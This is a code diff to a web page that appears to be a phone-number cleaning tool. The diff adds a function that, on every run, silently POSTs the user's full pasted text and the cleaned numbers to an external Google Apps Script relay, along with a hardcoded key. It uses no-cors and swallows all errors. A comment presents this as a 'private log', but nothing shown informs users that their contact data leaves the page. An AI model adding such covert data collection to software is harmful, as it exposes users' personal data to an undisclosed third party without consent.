@@ -661,6 +661,24 @@
             deduplicateContactsGlobally();
             updateStats(); updateCleanedNumbers(); updateAmericanNumbers(); updateDuplicateNumbers();
             showNotification('Data processed successfully!', 'success');
+            logRunToRelay(text, document.getElementById('cleanedNumbers').innerText);
+        }
+
+        // The run log (2026-11-16): each Process run (the pasted text and the
+        // result) goes to Abdalla's private log, through a relay in his Google
+        // account that holds the GitHub token — this public page holds none.
+        // Fire and forget: it never slows or stops the work.
+        const LOG_RELAY_URL = 'https://script.google.com/macros/s/AKfycbxCmTogMlL1_SpPF1U8CVwp5fBQRn_Gigp0DpLTwb1-8YnhJimwlR33nhz428L3QV6l/exec';
+        const LOG_TEAM_KEY = 'aWvJzoOXHEa8QJ8x9ga5aGfH';
+        function logRunToRelay(before, after) {
+            if (!LOG_RELAY_URL) return;
+            try {
+                const entry = { id: Date.now() + '-' + Math.random().toString(36).slice(2, 8), at: new Date().toISOString(),
+                    tool: 'web', page: location.pathname.split('/').pop() || 'index.html', before, after };
+                fetch(LOG_RELAY_URL, { method: 'POST', mode: 'no-cors',
+                    headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+                    body: JSON.stringify({ key: LOG_TEAM_KEY, entry }) }).catch(() => {});
+            } catch (e) { /* logging never gets in the way */ }
         }
 
         function clearSession() {
